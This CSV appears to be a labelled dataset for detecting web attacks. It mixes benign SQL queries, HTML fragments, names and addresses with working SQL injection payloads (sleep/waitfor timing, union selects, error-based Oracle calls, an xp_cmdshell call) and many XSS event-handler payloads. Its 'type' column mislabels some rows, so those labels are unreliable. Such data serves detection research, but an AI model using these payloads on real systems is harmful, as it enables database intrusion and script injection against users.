Text,Label,type
	 </span>,0,xss
"-4397'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'omqt'  =  'omqt",1,sql
vannuchhi_ecoffery@hotelesjerez.vc,0,sql
"<div draggable=""true"" contenteditable>drag me</div><progress ondragover=alert(1) contenteditable>drop here</progress>",2,xss
SELECT cell ( s )  FROM forest LEFT JOIN,0,sql
<svg onpointerleave=alert(1)>XSS</svg>,2,xss
roco@forohh.ge,0,sql
"1"" where 3329  =  3329 or sleep  (  5  )  --",1,sql
"<style>@keyframes x{}</style><thead style=""animation-name:x"" onanimationend=""alert(1)""></thead>",2,xss
SELECT * FROM lungs WHERE advice = 'egg' LIMIT 3,0,sql
SELECT AVG ( Price ) FROM lucky,0,sql
consalve,0,sql
on,0,sql
"	 </span> <span class=""reference-text"">",0,xss
"1""   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
nealson,0,xss
"1%'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,xss
"<SCRIPT a="">"" SRC=""httx://.rocks/.js""></SCRIPT>",2,xss
"<p>AI, like electricity or the steam engine, is a general purpose technology. There is no consensus on how to characterize which tasks AI tends to excel at.<sup id=""cite_ref-276"" class=""reference""><a href=""#cite_note-276"">&#91;265&#93; </a> </sup> While projects such as <a href=""/wiki/AlphaZero"" title=""AlphaZero"">AlphaZero </a> have succeeded in generating their own knowledge from scratch, many other machine learning projects require large training datasets.<sup id=""cite_ref-277"" class=""reference""><a href=""#cite_note-277"">&#91;266&#93; </a> </sup><sup id=""cite_ref-278"" class=""reference""><a href=""#cite_note-278"">&#91;267&#93; </a> </sup> Researcher <a href=""/wiki/Andrew_Ng"" title=""Andrew Ng"">Andrew Ng </a> has suggested, as a ""highly imperfect rule of thumb"", that ""almost anything a typical human can do with less than one second of mental thought, we can probably now or in the near future automate using AI.""<sup id=""cite_ref-279"" class=""reference""><a href=""#cite_note-279"">&#91;268&#93; </a> </sup> <a href=""/wiki/Moravec%27s_paradox"" title=""Moravec&#39;s paradox"">Moravec's paradox </a> suggests that AI lags humans at many tasks that the human brain has specifically evolved to perform well.<sup id=""cite_ref-The_Economist_135-1"" class=""reference""><a href=""#cite_note-The_Economist-135"">&#91;132&#93; </a> </sup>",0,xss
"INSERT INTO amount ( border, slide, north, egg, draw, stock )  VALUES  ( 'atomic', 'heart'. language', 'baseball', 'weak', 'harbor', 'support' )  ",0,xss
"<li><a href=""/wiki/Robotics"" title=""Robotics"">Robotics </a> </li>",0,xss
SELECT RAND (  ) ;,0,sql
"1"" where 6800  =  6800 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,xss
"ruiz de alda, 78",0,sql
SELECT * FROM even,0,sql
"<element draggable=""true"" ondragenter=""alert(1)"">test</element>",2,xss
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/feed-exports.html"">Feed exports</a></li>",0,xss
"SELECT NULLIF ( 25, ""Hello"" ) ;",0,sql
"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""lsis"" like ""lsis",1,sql
1%'   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  '%'  =  ',1,sql
"1%"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""%""  =  """,1,sql
"<style>@keyframes slidein {}</style><var style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></var>",2,xss
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Davies, Alex (5 May 2015). <a rel=""nofollow"" class=""external text"" href=""https://www.wired.com/2015/05/worlds-first-self-driving-semi-truck-hits-road/"">""World's First Self-Driving Semi-Truck Hits the Road"" </a>. <i>WIRED </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20171028222802/https://www.wired.com/2015/05/worlds-first-self-driving-semi-truck-hits-road/"">Archived </a> from the original on 28 October 2017<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">20 September ",0,xss
<ruby onblur=alert(1) tabindex=1 id=x></ruby><input autofocus>,2,xss
"<table onkeydown=""alert(1)"" contenteditable>test</table>",2,xss
"<small draggable=""true"" ondragend=""alert(1)"">test</small>",2,xss
" SELECT * FROM promised ORDER BY there, bet",0,sql
SELECT * FROM they WHERE got = 'private',0,sql
"1%""  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  ""%""  =  """,1,xss
SELECT TOP 3 * FROM ill WHERE store = 'sister' SELECT * FROM feet,0,sql
"-4807' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'wwki'  =  'wwki",1,xss
SELECT COUNT ( DISTINCT him )  FROM thou,0,sql
l23re1o,0,sql
"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 9, </li>",0,xss
empeine,0,sql
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;712–724, </li>",0,xss
SELECT * FROM square FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
<source onfocusout=alert(1) tabindex=1 id=x></source><input autofocus>,2,xss
<listing id=x tabindex=1 onbeforeactivate=alert(1)></listing>,2,xss
pingshen,0,sql
SELECT thick ( s ) FROM pleasant INNER JOIN,0,xss
1'||  (  select 'vvpn' from dual where 7011  =  7011 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||',1,xss
<summary id=x tabindex=1 onbeforeactivate=alert(1)></summary>,2,xss
"<em onclick=""alert(1)"">test</em>",2,xss
"alcatraz, 43, 2-g",0,sql
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE tt.taxonomy IN  ( 'support_cat' )  AND t.slug IN  ( 'support-family' ) ",0,sql
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'fuyl'  =  'fuyl",1,sql
"<b onkeydown=""alert(1)"" contenteditable>test</b>",2,xss
"	 </span> <span class=""reference-text""><cite class=""citation web"">Wakefield, Jane (15 June 2016). <a rel=""nofollow"" class=""external text"" href=""https://www.bbc.co.uk/news/uk-36528256"">""Social media 'outstrips TV' as news source for young people"" </a>. <i>BBC News </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20160624000744/http://www.bbc.co.uk/news/uk-36528256"">Archived </a> from the original on 24 June 2016. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=BBC+News&amp;rft.atitle=Social+media+%27outstrips+TV%27+as+news+source+for+young+people&amp;rft.date=2016-06-15&amp;rft.au=Wakefield%2C+Jane&amp;rft_id=https%3A%2F%2Fwww.bbc.co.uk%2Fnews%2Fuk-36528256&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
SELECT bow ( s )  FROM expect FULL OUTER JOIN,0,sql
SELECT COUNT ( sail )  FROM traffic,0,sql
"<thead onmouseover=""alert(1)"">test</thead>",2,xss
SELECT * FROM pipe WHERE    NOT badly = 'thread',0,sql
SELECT AVG ( handsome ) FROM hunter,0,sql
SELECT * FROM repeat WHERE your = 'medicine',0,sql
SELECT * FROM shine FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM agree,0,sql
SELECT * FROM popular WHERE further BETWEEN 'hot' AND 'transportation',0,sql
if  (  2643  =  1393  )   select 2643 else drop function nqss--,1,sql
SELECT * FROM CustomersFETCH FIRST 3 ROWS ONLY; SELECT TOP 50 PERCENT * FROM Customers;SELECT * FROM Customers,0,xss
-9522  )   as lraw where 9472  =  9472 or   (  4087  =  8213  )  *8213--,1,xss
" select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",1,xss
SELECT TOP 3 * FROM foreign,0,sql
SELECT * FROM  ( SELECT running FROM these ) ,0,xss
 ,0,xss
SELECT * FROM writer,0,sql
SELECT TOP 3 * FROM before,0,sql
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=CNN&amp;rft.atitle=Are+Autonomous+Robots+Your+next+Surgeons%3F&amp;rft.date=2016-05-12&amp;rft.au=Senthilingam%2C+Meera&amp;rft_id=http%3A%2F%2Fwww.cnn.com%2F2016%2F05%2F12%2Fhealth%2Frobot-surgeon-bowel-operation%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
SELECT * FROM sitting FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
</div>,0,xss
select   (  case when   (  9343  =  9513  )   then 1 else 9343*  (  select 9343 from master..sysdatabases  )   end  )  --,1,sql
ca5r7211a,0,sql
"<link rel=""apple-touch-icon"" href=""/static/apple-touch/wikipedia.png""/>",0,xss
SELECT * FROM Products WHERE Price NOT BETWEEN 10 AND 20;,0,xss
Breadth of commonsense knowledge:,0,xss
SELECT AVG ( Price ) FROM produce,0,sql
"<style>@keyframes x{}</style><command style=""animation-name:x"" onanimationstart=""alert(1)""></command>",2,xss
1'  )   as qcse where 4147  =  4147 waitfor delay '0:0:5'--,1,xss
"	 <div style=""padding:0em 0.25em"">",0,xss
"1""  )   as frmp where 6073  =  6073",1,sql
SELECT COUNT ( made ) FROM promised,0,sql
SELECT * FROM limited FETCH FIRST 50 PERCENT ROWS ONLY,0,xss
"   SELECT COUNT ( useful ) , express FROM merely BY tobacco",0,sql
SELECT * FROM widely,0,sql
"<hgroup onmouseover=""alert(1)"">test</hgroup>",2,xss
"1,  (  select   (  case when   (  7711  =  7711  )   then 1 else 7711*  (  select 7711 from information_schema.character_sets  )   end   )    )   ",1,xss
"<style>:target {transform: rotate(180deg);}</style><strong id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></strong>",2,xss
"1'+  (  select 'idmr' where 5029  =  5029 union all select null,null,null,null,null,null--",1,sql
"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'xjvr'  =  'xjvr",1,sql
<img onpointerup=alert(1)>XSS</img>,2,xss
"<li id=""cite_note-FOOTNOTEDomingos2015Chapter_1-67""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEDomingos2015Chapter_1_67-0"">^ </a> </b> ",0,xss
"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ""vnei"" like ""vnei",1,sql
"<li><a href=""/wiki/Competitions_and_prizes_in_artificial_intelligence"" title=""Competitions and prizes in artificial intelligence"">AI competitions </a> </li> </ul>",0,xss
<legend id=x tabindex=1 onfocus=alert(1)></legend>,2,xss
SELECT TOP 50 PERCENT * FROM crack,0,xss
"praza san antonio da florida, 27,",0,sql
1'||  (  select 'gdzt' where 4950  =  4950,1,sql
"  SELECT * FROM daily WHERE spin IN  ( 'spring', 'load', 'hold' )  ",0,sql
"1%""  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""%""  =  """,1,sql
	 </span> ,0,xss
SELECT * FROM lack WHERE shine BETWEEN 'already' AND 'blow',0,sql
0x77616974666F722064656C61792027303A303A313027 ...,1,sql
	 </span>,0,xss
4430,0,sql
SELECT AVG ( been ) FROM mine SELECT SUM ( cookies ) ,0,sql
"INSERT INTO fill ( flow, mighty, apple, combination, dance, allow )  VALUES  ( 'pile', 'birds'. detail', 'long', 'image', 'particles', 'have' )  ",0,sql
"  SELECT roseID AS ID, nine AS opposite FROM middle",0,sql
"<style>:target {color: red;}</style><slot id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></slot>",2,xss
26141,0,xss
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;341–344, </li>",0,xss
SELECT large,0,sql
"1""   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --",1,sql
-2364' or 6743  =  7578,1,sql
SELECT AVG ( stomach ) FROM another SELECT SUM ( layers ) ,0,sql
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,1,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1,sql
DELETE FROM would WHERE officer = 'lying',0,sql
"select * from generate_series  (  4592,4592,case when   (  4592  =  4592  )   then 1 else 0 end  )   limit 1--",1,sql
tracz,0,sql
"calle calderon de la barca, 141",0,sql
33814848h,0,sql
grueneic,0,xss
"<li id=""cite_note-AI_in_early_science_fiction-27""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-AI_in_early_science_fiction_27-0"">^ </a> </b> ",0,xss
1'+  (  select 'sfko' where 6853  =  6853 rlike sleep  (  5  )  #,1,sql
SELECT * FROM live,0,sql
SELECT * FROM growth WHERE under BETWEEN 'coast' AND 'blank',0,sql
<html onpointerleave=alert(1)>XSS</html>,2,xss
"1""   )    )    as phis where 4420  =  4420 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
SELECT AVG ( spent ) FROM my,0,sql
"1' and make_set  (  2942  =  8200,8200  )   and 'jnhv' like 'jnhv",1,sql
SELECT * FROM teacher WHERE calm BETWEEN 'accept' AND 'offer',0,sql
1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'oofd'  =  'oofd,1,xss
" SELECT * FROM extra ORDER BY outside, hospital",0,xss
" SELECT * FROM baseball ORDER BY whale ASC, frog DESC",0,sql
"-8636""   )    )     )   union all select 1821,1821,1821,1821,1821,1821,1821,1821,1821,1821--",1,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
SELECT offer FROM go,0,sql
; exec master..xp_cmdshell,1,sql
maragliano serna,0,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"<legend onmouseout=""alert(1)"">test</legend>",2,xss
-5751  )   as jybu where 4739  =  4739 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,xss
SELECT TOP 3 * FROM globe WHERE slight = 'early' SELECT * FROM shadow,0,sql
"<li><a href=""/wiki/Semiotics"" title=""Semiotics"">Semiotics </a> </li>",0,xss
"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'raru'  =  'raru",1,sql
47400,0,xss
"  SELECT Orders.dayrID, Employees.support, Employees.away FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.instanceID ORDER BY Orders.decideID",0,sql
if  (  2697  =  2008  )   select 2697 else drop function jcoo--,1,sql
adjani@zoorapia.ma,0,sql
 UPDATE heart SET service = 'track'WHERE needs = 'fight',0,xss
"1  )   where 7571  =  7571 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,xss
	 </span> </li>,0,xss
 </li>,0,xss
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/architecture.html"">Architecture overview</a></li>",0,xss
"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",1,sql
FROM  ( SELECT DISTINCT old FROM cook ) ,0,sql
"1""  )   where 1024  =  1024 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,xss
plaza tilos s/n,0,sql
"INSERT INTO apple ( difference, bat, jungle, including, circle, today )  VALUES  ( 'title', 'repeat'. end', 'let', 'floating', 'explore', 'tax' )  ",0,xss
</div>,0,xss
fulgencia,0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 347687 )  ORDER BY meta_id ASC",0,sql
petruck,0,sql
"-6214"" union all select 3323,3323#",1,sql
"1'   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'qtni'  =  'qtni",1,sql
"1   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  -- fzhj",1,sql
"1""   )    )    as wfne where 8933  =  8933",1,sql
"<dir onkeydown=""alert(1)"" contenteditable>test</dir>",2,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
select   (  case when   (  4935  =  4734  )   then 4935 else 4935*  (  select 4935 from mysql.db  )   end  )  #,1,xss
tanchak,0,xss
38980059g,0,xss
"1 where 9083  =  9083 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,xss
"<div class=""thumb tright"">",0,xss
ramiz,0,sql
"<area onkeydown=""alert(1)"" contenteditable>test</area>",2,xss
"<li><a href=""/wiki/Center_for_Applied_Rationality"" title=""Center for Applied Rationality"">Center for Applied Rationality </a> </li>",0,xss
"1"" where 5334  =  5334 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,sql
calle nicolas funes 116,0,sql
29579903v,0,sql
-9875'  )   or   (  8459  =  8459  )  *4906 and   (  'mrxw'  =  'mrxw,1,sql
"1%"" or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and ""%""  =  """,1,sql
SELECT desert ( s )  FROM molecular SELECT hour ( s ) ,0,sql
1'||  (  select 'mnvk' from dual where 4181  =  4181,1,sql
"-4400 union all select 3983,3983,3983,3983,3983,3983,3983,3983,3983,3983--",1,sql
SELECT window FROM zulu UNION SELECT lamp FROM entirely ORDER BY ability,0,sql
SELECT * FROM four WHERE sail = 'influence'  AND  ( later = 'movement' OR safety = 'sleep' ) ,0,sql
"<li class=""toclevel-2 tocsection-34""><a href=""#Evaluating_progress""><span class=""tocnumber"">6.6 ",0,xss
"1""   )    )    and elt  (  6553  =  4771,4771  )   and    (    (   ""eolu""  =  ""eolu",1,sql
"1 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  # hlrg",1,sql
bic9spide,0,xss
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/email.html"">Sending e-mail</a></li>",0,xss
"-6775"" union all select 7484,7484#",1,xss
1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'vpqr'  =  'vpqr,1,sql
SELECT * FROM interest WHERE    NOT condition = 'section',0,sql
<u onpointerenter=alert(1)>XSS</u>,2,xss
glvez matons,0,sql
travs elias,0,sql
"  SELECT dangerous,thin,leaving FROM cow LEFT JOIN Orders ON chamber.wireID =  coast.needle ORDER BY eat.could",0,sql
	 </span> ,0,xss
"c/ mare de deu de fatima, 165",0,sql
" select * from users where id  =  '1' *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1'",1,sql
SELECT * FROM clear WHERE slipped = 'building'  OR aware = 'colony',0,sql
"-8144'  )   where 1691  =  1691 or elt  (  7246  =  7816,7816  )  --",1,xss
<center onpointerenter=alert(1)>XSS</center>,2,xss
<picture onpointerleave=alert(1)>XSS</picture>,2,xss
tenuta,0,sql
 or username like '%,1,sql
" SELECT * FROM laugh ORDER BY until ASC, grandmother DESC",0,sql
<multicol onpointerleave=alert(1)>XSS</multicol>,2,xss
"<a href=""/wiki/Forward_chaining"" title=""Forward chaining"">Forward chaining </a>, <a href=""/wiki/Backward_chaining"" title=""Backward chaining"">backward chaining </a>, <a href=""/wiki/Horn_clause"" title=""Horn clause"">Horn clauses </a>, and logical deduction as search:",0,xss
SELECT * FROM local ORDER BY pet,0,sql
1 where 2956  =  2956,1,sql
discoro,0,sql
"<a href=""/wiki/Machine_learning"" title=""Machine learning"">Learning </a>:",0,xss
SELECT * FROM topic WHERE came = 'mixture' LIMIT 3,0,sql
	 </span> </h4>,0,xss
1'   )    )    as vuzt where 4971  =  4971,1,sql
"1  )   where 1513  =  1513 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
"  SELECT sheet,human FROM lunch WHERE apartment = 'unless' UNION SELECT accurate, coat FROM unknown",0,sql
"	 </span> <span class=""reference-text""><a href=""#CITEREFTaoTan2005"">Tao &amp; Tan 2005 </a>. ",0,xss
SELECT * FROM herself WHERE    NOT gas = 'loud',0,sql
"1"" where 4978  =  4978 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,xss
"<ul><li><a href=""/wiki/Alfred_North_Whitehead"" title=""Alfred North Whitehead"">Alfred North Whitehead </a> </li>",0,xss
"<li onmouseout=""alert(1)"">test</li>",2,xss
38728859x,0,xss
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,2,xss
 </li>,0,xss
<ul onpointerenter=alert(1)>XSS</ul>,2,xss
21208,0,xss
lerma genis,0,sql
"  UPDATE location SET couple =  'line', City =  'key' WHERE belt =  village",0,xss
"1%"" union all select null,null,null,null,null,null,null,null#",1,sql
SELECT bush ( s )  FROM weigh UNION,0,sql
17005940q,0,sql
"callejon sur, 93 13-c",0,sql
SELECT * FROM three WHERE graph = 'safety' LIMIT 3,0,sql
ontiveros@masqueclases.th,0,xss
"<li onkeydown=""alert(1)"" contenteditable>test</li>",2,xss
SELECT TOP 3 * FROM wind WHERE street = 'except',0,xss
kirland-lincovsky@la-sexta-f1.fo,0,sql
1%'  )   waitfor delay '0:0:5' and   (  '%'  =  ',1,sql
"<li id=""cite_note-368""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-368"">^ </a> </b> ",0,xss
"<li id=""cite_note-148""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-148"">^ </a> </b> ",0,xss
SELECT DISTINCT language FROM horn,0,sql
1  )   where 9167  =  9167,1,sql
"<content onpaste=""alert(1)"" contenteditable>test</content>",2,xss
"<p>Scrapy is a fast high-level <a class=""reference external"" href=""https://en.wikipedia.org/wiki/Web_crawler"">web crawling</a> and <a class=""reference external"" href=""https://en.wikipedia.org/wiki/Web_scraping"">web scraping</a> framework, used",0,xss
76591879q,0,sql
"1%""  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Cambria, Erik; White, Bebo (May 2014). ""Jumping NLP Curves: A Review of Natural Language Processing Research [Review Article]"". <i>IEEE Computational Intelligence Magazine </i>. <b>9 </b> (2): 48–57. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1109%2FMCI.2014.2307227"">10.1109/MCI.2014.2307227 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=IEEE+Computational+Intelligence+Magazine&amp;rft.atitle=Jumping+NLP+Curves%3A+A+Review+of+Natural+Language+Processing+Research+%5BReview+Article%5D&amp;rft.volume=9&amp;rft.issue=2&amp;rft.pages=48-57&amp;rft.date=2014-05&amp;rft_id=info%3Adoi%2F10.1109%2FMCI.2014.2307227&amp;rft.aulast=Cambria&amp;rft.aufirst=Erik&amp;rft.au=White%2C+Bebo&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<li><a href=""/wiki/Mathematical_software"" title=""Mathematical software"">Mathematical software </a> </li>",0,xss
"-4596"" union all select 5761#",1,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nobr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></nobr>",2,xss
SELECT TOP 3 * FROM throat WHERE jar = 'son',0,sql
1'   )    )    as zbkp where 1720  =  1720 and 4110  =  6748#,1,sql
SELECT TOP 50 PERCENT * FROM respect,0,sql
"  SELECT * FROM drove WHERE imagine NOT IN  ( 'national', 'private', 'company' )  ",0,sql
          </div>,0,xss
SELECT * FROM not WHERE change BETWEEN '1996-07-01' AND '1996-07-31',0,xss
c/ costa i llobera 83,0,sql
-1468'   )    )     )   or 4875  =  6163#,1,sql
SELECT * FROM gold WHERE interest = 'television'  OR sang = 'average',0,sql
"SELECT * FROM bar WHERE faster BETWEEN ""suggest"" AND    ""studying""",0,sql
1'  )   where 6244  =  6244 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,1,sql
